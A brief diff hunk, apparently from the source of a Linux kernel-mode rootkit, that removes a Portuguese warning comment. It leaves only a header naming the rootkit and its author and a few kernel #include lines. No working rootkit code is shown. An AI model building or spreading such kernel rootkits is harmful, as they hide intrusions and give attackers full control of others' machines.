@@ -1,6 +1,5 @@
 //ring - km (ring 0) rootkit for linux kernel 2.x/3.x/4.x/5.x/6.x
 //written by gbr
-//tenha muito cuidado ao editar algo ou copiar, nem eu mesmo sei e entendo o que fiz aqui!
 #include <linux/syscalls.h>
 #include <linux/slab.h>
 #include <linux/stat.h>
